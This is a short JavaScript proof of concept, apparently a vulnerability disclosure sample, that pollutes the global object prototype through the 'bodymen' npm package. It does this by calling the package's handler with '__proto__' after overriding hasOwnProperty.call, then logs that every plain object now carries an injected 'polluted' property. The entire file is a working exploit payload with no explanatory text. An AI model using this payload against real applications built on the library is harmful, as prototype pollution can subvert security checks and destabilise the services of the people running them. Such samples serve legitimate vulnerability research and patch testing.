Object.prototype.hasOwnProperty.call = () => true;
const x = require('bodymen');
console.log({}.polluted);
x.handler('__proto__', 'polluted', 'yes');
console.log({}.polluted);